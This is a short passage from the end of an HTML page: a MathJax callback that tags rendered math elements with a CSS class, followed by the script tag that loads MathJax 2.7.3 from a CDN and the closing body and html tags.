    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>

</body>
</html>